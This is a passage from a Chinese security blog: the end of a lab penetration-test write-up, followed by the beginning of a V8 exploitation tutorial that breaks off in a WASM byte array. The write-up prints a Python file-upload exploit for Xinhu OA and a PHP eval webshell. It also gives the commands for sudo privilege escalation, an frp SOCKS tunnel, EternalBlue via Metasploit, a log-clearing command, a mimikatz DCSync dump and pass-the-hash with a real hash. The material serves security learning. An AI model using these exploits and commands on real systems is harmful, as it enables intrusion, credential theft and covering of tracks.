&#x2F;usr&#x2F;bin&#x2F;mysql</p></blockquote><p>这说明我们可以通过通过 <code>sudo</code> 高权限运行 <code>mysql</code>，进而能够执行 <code>root</code>权 限才能执行的命令，可以参考下面这篇文章，里面也有讲很多种提取的方法<br><a href="https://blog.csdn.net/Bossfrank/article/details/132035121">渗透测试：Linux提权精讲（三）之sudo方法第三期_nmap sudo 提权-CSDN博客</a></p><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/11.png" class="" title="我的图图呢">  <p>于是我们就能很容易的获取到 <code>flag1</code>，可以发现 <code>flag1</code> 在 <code>/root/flag</code> 目录下</p><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/12.png" class="" title="我的图图呢">  <h3 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h3><p>接下来就是要考虑内网横向移动，我们的最终目的是获取域控上的 <code>flag</code>，我们先用蚁剑上传 <code>fscan</code>，扫描一下内网中有那些存活机器</p><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/13.png" class="" title="我的图图呢">  <p>这里要记得给 <code>fscan</code> 执行权限，否则会执行不了<br>通过 <code>ip a</code> 我们可以发现网段为 <code>172.22.1.0/24</code></p><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/14.png" class="" title="我的图图呢">  <p>扫描的结果会自动存在当前目录的 <code>result.txt</code> 文件上</p><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/15.png" class="" title="我的图图呢">  <p>于是我们搜集到如下信息：</p><blockquote><p>172.22.1.2:DC域控<br>172.22.1.21:Windows的机器并且存在MS17-010 漏洞<br>172.22.1.18:信呼OA办公系统</p></blockquote><p>而我们的最终目标即为 <code>DC</code> 域控<br>我们搜先是对 <code>OA</code> 办公系统进行攻击，在这之前我们要先进行内网穿透，其目的是使我们能够在攻击机访问内网的服务，这里我们需要一台 <code>vps</code> 和工具 <code>frp</code>，学过web的师傅都知道 <code>vps</code> 是什么，这里就不做解释，<code>frp</code> 的相关知识也请读者自行学习，这里只做简单的介绍。<code>frp</code>的下载地址为，有linux和windows版本：<br><a href="https://github.com/fatedier/frp">fatedier&#x2F;frp: A fast reverse proxy to help you expose a local server behind a NAT or firewall to the internet. (github.com)</a><br>该工具的目录如下：</p><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/16.png" class="" title="我的图图呢">  <p>其中 <code>frpc</code> 和 <code>frps</code> 是可执行文件，我们需要将 <code>frps</code> 和 <code>frps.ini</code> 上传到我们的 <code>vps</code>，<code>frpc</code><br>和 <code>frpc.ini</code> 上传到我们的靶机<br>下面是我相关文件的配置<br>frpc.ini：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[common] </span><br><span class="line">server_addr = 120.46.199.181 # 我vps的ip地址</span><br><span class="line">server_port = 7000  </span><br><span class="line"></span><br><span class="line">[socks5] </span><br><span class="line">type = tcp   </span><br><span class="line">plugin = socks5  </span><br><span class="line">remote_port = 798</span><br></pre></td></tr></table></figure><p>frps.ini：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_port = 7000</span><br></pre></td></tr></table></figure><p>这里要确保你的 <code>vps</code> 开启了 <code>7000</code> 和 <code>798</code> 端口<br>然后在靶机执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frpc -c frpc.ini</span><br></pre></td></tr></table></figure><p>在 <code>vps</code> 执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frps -c frps.ini</span><br></pre></td></tr></table></figure><p>最后在攻击机你自己的电脑上（<code>windows</code>，不是 <code>kali</code>，<code>kali</code> 的配置方法在后面有讲）使用 <code>Proxy Servers</code> 配置 <code>socks5</code> 代理即可</p><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/17.png" class="" title="我的图图呢">  <p>其原理我不懂，学院到现在还没有教计算机网络，加上我一个纯pwn手也没去研究这种东西（其实是我懒），请师傅们轻点骂 :-(<br>最后还要在 <code>Proxy Servers</code> 上配置一下 <code>Proxificantion Rule</code>，吧除了刚配置的那一项以外的全部勾勾去掉，不然还是会访问不了，原理还是不知道🤔<br>配置完后就能直接在浏览器中输入 <code>172.22.1.18</code> 进行访问了，可以看到该系统的版本是 <code>2.2.8</code> （这个是重点，可以通过搜索系统的版本号看看有没有已经给发现的漏洞）</p><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/18.png" class="" title="我的图图呢">  <p>这里存在一个弱口令，admin&#x2F;admin123。</p><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/19.png" class="" title="我的图图呢">  <p>登录后就是 <code>web</code> 手的事情了，这个系统存在文件上传漏洞，有直接的 <code>poc</code>，这里我直接参考：<br><a href="https://blog.csdn.net/solitudi/article/details/118675321">[代码审计]信呼协同办公系统2.2存在文件上传配合云处理函数组合拳RCE_信呼协同办公系统弱口令-CSDN博客</a><br>exp.py：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line"></span><br><span class="line">url_pre = <span class="string">&#x27;http://url/&#x27;</span></span><br><span class="line">url1 = url_pre + <span class="string">&#x27;?a=check&amp;m=login&amp;d=&amp;ajaxbool=true&amp;rnd=533953&#x27;</span></span><br><span class="line">url2 = url_pre + <span class="string">&#x27;/index.php?a=upfile&amp;m=upload&amp;d=public&amp;maxsize=100&amp;ajaxbool=true&amp;rnd=798913&#x27;</span></span><br><span class="line">url3 = url_pre + <span class="string">&#x27;/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=11&#x27;</span></span><br><span class="line"></span><br><span class="line">data1 = &#123;</span><br><span class="line">    <span class="string">&#x27;rempass&#x27;</span>: <span class="string">&#x27;0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;jmpass&#x27;</span>: <span class="string">&#x27;false&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;device&#x27;</span>: <span class="string">&#x27;1625884034525&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;ltype&#x27;</span>: <span class="string">&#x27;0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;adminuser&#x27;</span>: <span class="string">&#x27;dGVzdA::&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;adminpass&#x27;</span>: <span class="string">&#x27;YWJjMTIz&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;yanzm&#x27;</span>: <span class="string">&#x27;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r = session.post(url1, data=data1)</span><br><span class="line">r = session.post(url2, files=&#123;<span class="string">&#x27;file&#x27;</span>: <span class="built_in">open</span>(<span class="string">&#x27;1.php&#x27;</span>, <span class="string">&#x27;r+&#x27;</span>)&#125;)</span><br><span class="line"></span><br><span class="line">filepath = <span class="built_in">str</span>(r.json()[<span class="string">&#x27;filepath&#x27;</span>])</span><br><span class="line">filepath = <span class="string">&quot;/&quot;</span> + filepath.split(<span class="string">&#x27;.uptemp&#x27;</span>)[<span class="number">0</span>] + <span class="string">&#x27;.php&#x27;</span></span><br><span class="line"><span class="built_in">id</span> = r.json()[<span class="string">&#x27;id&#x27;</span>]</span><br><span class="line"></span><br><span class="line">url3 = url_pre + <span class="string">f&#x27;/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>&#x27;</span></span><br><span class="line"></span><br><span class="line">r = session.get(url3)</span><br><span class="line">r = session.get(url_pre + filepath + <span class="string">&quot;?1=system(&#x27;whoami&#x27;);&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>相同目录下还有一个 <code>1.php</code> 文件存的是一句话木马<br>1.php:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;1&quot;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>运行后可以看到文件上传的路径：</p><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/20.png" class="" title="我的图图呢">  <p>然后直接蚁剑连接：</p><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/21.png" class="" title="我的图图呢">  <p>连接成功：</p><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/22.png" class="" title="我的图图呢">  <p>可以看到已经拥有了 <code>system</code> 权限，我们直接在 <code>Administrator</code> 用户的目录下找到 <code>flag2</code></p><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/23.png" class="" title="我的图图呢">  <h3 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h3><p>接下来我们就对 <code>ip 172.22.1.21</code> 进行渗透，这里需要用到渗透框架 <code>Metasploit Framework</code>，<code>kali</code> 自带这个框架，这里的攻击机我选用 <code>kali</code>（windows也可以安装Metasploit Framework，不过上面我说过也要讲讲如何在kali设置代理）。我们首先要在 <code>kali</code> 中设置 <code>socks5</code> 代理，否则我们无法访问其内网的环境。<br>在 <code>kali</code> 中设置代理比 <code>windows</code> 简单很多，他自带了一个 <code>proxychains4</code> 工具，我们只需要编辑 <code>etc</code> 目录下的 <code>proxychians4.conf</code> 文件：</p><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/24.png" class="" title="我的图图呢">  <p>在最下面的 <code>ProxyList</code> 上加上 <code>socks5 vps ip 端口</code> 即可  </p><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/25.png" class="" title="我的图图呢">  <p>然后就能在浏览器中访问靶机内网的 <code>172.22.1.*</code> 那三台机器了<br>在上面用 <code>fscan</code> 的扫描中我们发现该机子存在 <code>MS17-010</code> 漏洞，这个就是大名鼎鼎的永恒之蓝漏洞<br>我们先在 <code>kali</code> 输入 <code>msfconsole</code> 启动 <code>Metasploit Framework</code> （后面简称 <code>msf</code>）</p><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/26.png" class="" title="我的图图呢">  <p>可以看见界面十分的酷炫，而且每次启动 <code>msf</code> 时这个图片都会不一样<br>输入 <code>search ms17-010</code> 搜索 <code>ms17-010</code> 相关模块，可以看到一共找到了 <code>4</code> 个不同的模块：</p><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/27.png" class="" title="我的图图呢">  <p>这里我们选择使用第一个模块，因为他影响是版本比较多，然后接下来依次输入以下命令来发起永恒之蓝攻击：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_eternalblue  <span class="comment"># 选择使用的模块</span></span><br><span class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/bind_tcp_uuid  <span class="comment"># 设置payload，可以通过show payloads查看</span></span><br><span class="line"><span class="built_in">set</span> RHOSTS 172.22.1.21  <span class="comment"># 设置靶机的ip</span></span><br><span class="line">exploit  <span class="comment"># 发起攻击</span></span><br></pre></td></tr></table></figure><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/28.png" class="" title="我的图图呢">  <p>运行成功会出现meterpreter&gt;<br>该 <code>Meterpreter</code> 是 <code>metasploit</code> 的一个扩展模块，可以调用 <code>metasploit</code> 的一些功能，对目标系统进行更深入的渗透，入获取屏幕、上传&#x2F;下载文件、创建持久后门等。<br>下面介绍一些该模块常用的命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; screenshot <span class="comment"># 捕获屏幕</span></span><br><span class="line">meterpreter &gt; upload hello.txt c:// <span class="comment">#上传文件</span></span><br><span class="line">meterpreter &gt; download d://1.txt <span class="comment"># 下载文件</span></span><br><span class="line">meterpreter &gt; shell <span class="comment"># 获取cmd</span></span><br><span class="line">meterpreter &gt; clearev <span class="comment"># 清除日志</span></span><br></pre></td></tr></table></figure><p>紧接着上图，可以发现我们已经成功的打进该主机，遗憾的是该机子上并没有 <code>flag</code>  ，也就是说我们最后的<code>flag</code> 在 <code>windows DC</code> 域控制器上面<br>接下来是进行 <code>DCSync</code> 攻击，这里简单解释一下：<br>首先，什么是 <code>DCSync</code></p><blockquote><p>在域中，不同的域控之间，默认每隔15min就会进行一次域数据同步。当一个额外的域控想从其他域控同步数据时，额外域控会像其他域控发起请求，请求同步数据。如果需要同步的数据比较多，则会重复上述过程。DCSync就是利用这个原理，通过目录复制服务（Directory Replication Service，DRS）的GetNCChanges接口像域控发起数据同步请求，以获得指定域控上的活动目录数据。目录复制服务也是一种用于在活动目录中复制和管理数据的RPC协议。该协议由两个RPC接口组成。分别是drsuapi和dsaop。<br>DCSync是mimikatz在2015年添加的一个功能，由Benjamin DELPY gentilkiwi和Vincent LE TOUX共同编写，能够用来导出域内所有用户的hash</p></blockquote><p>也就是说我们可以通过 <code>DCSync</code> 来导出所有用户的 <code>hash</code> 然后进行哈希传递攻击，要想使用 <code>DCSync</code> 必须获得以下任一用户的权限：</p><blockquote><p>Administrators 组内的用户<br>Domain Admins 组内的用户<br>Enterprise Admins 组内的用户域控制器的计算机帐户</p></blockquote><p>现在我们回到一开始 <code>fscan</code> 的扫描结果：</p><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/29.png" class="" title="我的图图呢">  <p>我们可以看到我们用永恒之蓝打下的这台机子是 <code>enterprise</code> 用户，也就是说满足 <code>DCSync</code> 攻击的条件，于是我们在 <code>msf</code> 中依次输入以下命令来获取用户的 <code>hash</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">load kiwi  <span class="comment"># 调用mimikatz模块</span></span><br><span class="line">kiwi_cmd <span class="string">&quot;lsadump::dcsync /domain:xiaorang.lab /all /csv&quot;</span> <span class="built_in">exit</span>  <span class="comment"># 导出域内所有用户的信息(包括哈希值)</span></span><br></pre></td></tr></table></figure><p>结果如下：</p><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/30.png" class="" title="我的图图呢">  <p>这里我们比较关注是 <code>Administrator</code> 用户的 <code>hash</code>，接下来我们使用 <code>crackmapexec</code> 来进行哈希传递攻击，来实现 <code>DC域控</code> 上的任意命令执行，通过以下命令来获取 <code>flag3</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec smb 172.22.1.2 -u administrator -H10cf89a850fb1cdbe6bb432b859164c8 -d xiaorang.lab -x <span class="string">&quot;type Users\Administrator\flag\flag03.txt&quot;</span></span><br></pre></td></tr></table></figure><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/31.png" class="" title="我的图图呢">  <p>最终 <code>flag</code> 为 <code>flag&#123;60b53231-2ce3-4813-87d4-e8f88d0d43d6&#125;</code></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>感觉这种渗透和穿透的web还是有一点区别，从外网打进内网的过程要第一步要做的不是自己去寻找和日漏洞，而是看看系统有没有历史遗留的漏洞以及是否有现成的exp进行攻击。打国决的时候有的队伍拿着现成的exp直接开局2分钟就打进内网了，而我们队伍就和做传统web题目一样一步一步的打，耗费了很多时间才打进去，非常的吃亏。<br>在打这个靶场中花费时间最多的是用 <code>frp</code> 进行内网穿透，主要是我理解能力比较差，网上的文章看的似懂非懂的。期间还请教了unknown师傅和panz0e师傅，然后某人就因为这件事情没完成上班任务😂😂😂😂😂</p><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/32.png" class="" title="我的图图呢">  <p>虽然靶场比较简单，可是还是花费了我许多的时间，还是Csome师兄说的那句话：“菜就多练”，这一年打算多练练渗透，希望明年国赛不会留下遗憾<br>参考：<br><a href="https://3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-DCSync">域渗透——DCSync (3gstudent.github.io)</a><br><a href="https://blog.csdn.net/weixin_63576152/article/details/133462469">春秋云境Initial-WP（附带详细代理过程）_lnitial靶机-CSDN博客</a><br><a href="https://blog.csdn.net/ElsonHY/article/details/109939420">MS17-010（Eternal blue永恒之蓝）漏洞利用+修复方法-CSDN博客</a><br><a href="https://bbs.kanxue.com/thread-269208.htm">[原创]MS17-010 “永恒之蓝”漏洞分析与复现-二进制漏洞-看雪-安全社区|安全招聘|kanxue.com</a><br><a href="https://cloud.tencent.com/developer/article/1861364">内网渗透｜谈谈HASH传递那些世人皆知的事-腾讯云开发者社区-腾讯云 (tencent.com)</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>初探v8漏洞利用</title>
      <link href="/2024/05/05/v8start/"/>
      <url>/2024/05/05/v8start/</url>
      
        <content type="html"><![CDATA[<p>一直觉得 <code>v8</code> 漏洞利用是一件非常好玩的事情，所以找时间入门了一下，这篇博客所使用的环境是 <code>*CTF 2019</code> 的 <code>oob</code>，相关附件读者可以自行上网搜索下载。这篇博客主要用于总结本人在入门 <code>v8</code> 漏洞利用时所学到的东西，由于 <code>Qanux</code> 又菜又爱玩，文章不免存在许多的问题，请读者多多包容  </p><h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><p>在开始之前，肯定有很多人想问 v8 是一个什么东西，下面是在知乎中搜到的对于 v8 的描述：  </p><blockquote><p>V8引擎是由C++编写的Google开源高性能JavaScript和WebAssembly引擎，它用于Chrome和Node.js等。<br>V8可以独立运行，也可以嵌入到任何C++应用程序中。<br>V8支持众多操作系统，如Windows、linux、android等，也支持其他硬件架构，如IA32,X64,ARM等，具有很好的可移植和跨平台特性。  </p></blockquote><p>作为 <code>js</code> 引擎，<code>V8</code> 会编译 &#x2F; 执行 <code>JavaScript</code> 代码，管理内存，负责垃圾回收，与宿主语言的交互等。通过暴露宿主对象 (变量，函数等) 到 <code>JavaScript</code>，<code>JavaScript</code> 可以访问宿主环境中的对象，并在脚本中完成对宿主对象的操作。<br>接下来看看 <code>v8</code> 工作原理的简化细分：  </p><img src="/2024/05/05/v8start/1.png" class="" title="我的图图呢">  <p>当 <code>Chrome</code> 或 <code>Node.js</code> 需要执行一段 <code>JavaScript</code> 代码时，它会将源代码传递给 <code>V8</code>。<code>V8</code> 将 <code>JavaScript</code> 源代码送入所谓的解析器 (<code>Parser</code>)，解析器为源代码创建一个抽象语法树 (<code>AST</code>) 表示。<code>AST</code> 随后被传递给新引入的 <code>Ignition</code> 解释器，在那里它被转换成一系列字节码。然后，<code>Ignition</code> 执行这个字节码序列。<br>在执行过程中，<code>Ignition</code> 收集了有关某些操作输入的剖析信息或反馈。其中一些反馈被 <code>Ignition</code> 自身用来加速后续的字节码解释。例如，对于属性访问，如果在所有时间都具有相同的形状 (即你总是为属性a传递一个值，其中 <code>a</code> 是一个字符串)，我们会缓存如何获取 <code>a</code> 值的信息。在后续执行相同的字节码时，我们不需要再次搜索a。这里的底层机制称为内联缓存 (<code>IC</code>)。  </p><p>接下来再聊聊什么是 <code>d8</code>。<code>d8</code> 是一个非常有用的调试工具，你可以把它看成是 <code>debug for V8</code> 的缩写。我们可以使用 <code>d8</code> 来查看 <code>V8</code> 在执行 <code>JavaScript</code> 过程中的各种中间数据，比如作用域、AST、字节码、优化的二进制代码、垃圾回收的状态，还可以使用 <code>d8</code> 提供的私有 <code>API</code> 查看一些内部信息。  </p><h2 id="走进v8"><a href="#走进v8" class="headerlink" title="走进v8"></a>走进v8</h2><p>本来想写写如何配置 <code>v8</code> 环境的，可是网上相关资料太多了，加上笔者比较懒，就没写，等哪天心血来潮再补上吧  </p><h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><p>在给 <code>gdb</code> 配置好 <code>v8</code> 的调试文件后，即可利用如下命令来调试我们的 <code>JavaScript</code> 代码：  </p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb ./d8</span><br><span class="line">r --allow-natives-syntax --shell ./exp.js</span><br></pre></td></tr></table></figure><p>这里解释一下命令里面的几个参数：  </p><ul><li>–allow-natives-syntax：开启原生 <code>API</code> (用的比较多)  </li><li>–shell：运行脚本后切入交互模式</li></ul><p>在调试的过程中我们可以在代码中加入如下代码来进行调试：  </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">%<span class="title class_">DebugPrint</span>(obj);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br></pre></td></tr></table></figure><p>其中 <code>%DebugPrint(obj);</code> 作用为打印对象的信息 (<code>debug</code> 版本的 <code>d8</code> 可以打印对象的详细信息，而 <code>release</code> 版本的 <code>d8</code> 只会打印对象类型和对象的地址)，<code>%SystemBreak();</code> 的作用类似于断点<br>由于标准的 <code>JavaScript</code> 并不支持以上语法，所以在运行时要加上 <code>--allow-natives-syntax</code> 选项<br>现在使用如下代码来进行测试：  </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="number">1</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">4</span>];</span><br><span class="line">%<span class="title class_">DebugPrint</span>(a);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br></pre></td></tr></table></figure><p>启动效果如下：  </p><img src="/2024/05/05/v8start/2.png" class="" title="我的图图呢">  <p>可以看见打印出了这个整数数组的地址，由于我这个 <code>d8</code> 是 <code>release</code> 版本，所以并没有打印出该数组对象的详细信息，但我们可以使用 <code>job</code> 命令来达到相同的效果  </p><img src="/2024/05/05/v8start/3.png" class="" title="我的图图呢">  <p>这里有个需要注意的点，那就是 <code>DebugPrint</code> 打印出来的是真实地址加一，而 <code>job</code> 命令后面接着的也需要是 <code>object</code> 的真实地址加一，不然会被解析成 <code>smi</code> 类型  </p><h3 id="v8-object的基本结构"><a href="#v8-object的基本结构" class="headerlink" title="v8 object的基本结构"></a>v8 object的基本结构</h3><p>首先给出 <code>object</code> 的通用结构：  </p><img src="/2024/05/05/v8start/4.png" class="" title="我的图图呢">  <p>不同对象的 <code>object</code> 结构都会不一样，但是都有很多相似之处，现在就来详细分析上面给出的例子，为了防止忘记，这里再次贴出代码：  </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="number">1</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">4</span>];</span><br><span class="line">%<span class="title class_">DebugPrint</span>(a);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br></pre></td></tr></table></figure><p>还是给出一样的结果：  </p><img src="/2024/05/05/v8start/3.png" class="" title="我的图图呢">  <p>可以看出该对象为 <code>JSArray</code>，其结构和 <code>object</code> 的通用结构差不多，但是还是有一点点区别<br>下面是 <code>JSArray</code> 的结构图：</p><img src="/2024/05/05/v8start/5.png" class="" title="我的图图呢">  <p>其各个字段的含义大致如下：  </p><ul><li>map：定义了如何访问对象，具有相同 <code>Map</code> 的两个 <code>JS object</code> ，就代表具有相同的类型（即具有以相同顺序命名的相同属性），比较 Map 的地址即可确定类型是否⼀致，同理，替换掉 Map 就可以进行类型混淆。  </li><li>prototype：对象的原型（如果有） </li><li>elements：对象的地址  </li><li>length：长度</li></ul><p>我们可以在 <code>gdb</code> 中查看 <code>elements</code>  </p><img src="/2024/05/05/v8start/6.png" class="" title="我的图图呢">  <p>可以看见 <code>elements</code> 中的数据也分为 <code>3</code> 层，分别为 <code>map</code> 指针、<code>length</code>、<code>data</code><br>这里还有一个需要注意的地方，那就是 <code>elements</code> 的地址是在 <code>object</code> 的上方的，也就是说程序在申请一个对象时，是先向堆申请一块空间用于存储对象的数据，再申请一块空间用于管理该对象。虽然 <code>elements</code> 是在 obj 上上方，但这并不代表 <code>elements</code> 就一定紧贴着 <code>obj</code>，这个问题我打算留到后面再讲<br>好像相关结构了解到这里就差不多了，如果后面还有别的那就再补补吧（笑  </p><h3 id="v8漏洞利用思想"><a href="#v8漏洞利用思想" class="headerlink" title="v8漏洞利用思想"></a>v8漏洞利用思想</h3><p>通过上面对 <code>object</code> 结构的分析，也许有人已经知道进行漏洞的利用了。可以猜测我们对一个对象进行访问时下标的最大值是由 <code>elements</code> 上的 <code>length</code> 所决定的，如果我们可以修改这个 <code>length</code> 为一个很大的值，我们就能够做到越界读写。同时，如果我们可以修改 <code>obj</code> 中的 <code>map</code>，我们令其出现神奇的效果，具体在下面漏洞利用中再分析<br>在平时的 <code>CTF</code> 题目中我们的目的是如何让程序执行 <code>system(&quot;/bin/sh&quot;)</code>，而在 <code>v8</code> 中，我们的目的是让 v8 任意执行我们的 <code>shellcode</code><br>然而实现这一切需要一个前提，那就是需要存在 <code>rwx</code> 权限的区域。这时候就需要 <code>WASM</code> 登场了<br>什么是 <code>WASM</code>？顾名思义，是 <code>Asm on the web</code>，但其实不是真正意义上的汇编，只是更加接近汇编。<code>WASM</code> 可以在 <code>Javascript Engine</code> 的地址空间中导入一块可读可写可执行的内存页。<br>下面看看这一段代码：  </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> wasm_code = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>([<span class="number">0</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">133</span>, <span class="number">128</span>, <span class="number">128</span>,</span><br><span class="line">    <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">96</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">127</span>, <span class="number">3</span>, <span class="number">130</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">132</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">1</span>, <span class="number">112</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">131</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">129</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span 